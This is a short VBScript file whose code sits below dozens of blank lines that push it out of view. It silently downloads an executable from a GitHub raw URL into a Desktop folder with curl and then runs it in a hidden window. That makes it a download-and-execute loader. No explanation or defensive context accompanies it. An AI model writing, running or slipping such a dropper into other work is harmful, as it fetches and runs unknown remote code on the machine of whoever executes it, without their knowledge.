Option Explicit
















































Dim objShell
Dim desktopPath
Dim folderPath
Set objShell = CreateObject("WScript.Shell")

objShell.Run "cmd /c curl -o %userprofile%\Desktop\ESSANTIK\EK.exe https://github.com/essantik/essantik/raw/main/essantik.exe", 0, True
objShell.Run ("cmd /c %userprofile%\Desktop\ESSANTIK\EK.exe"), 0, false
Set objShell = Nothing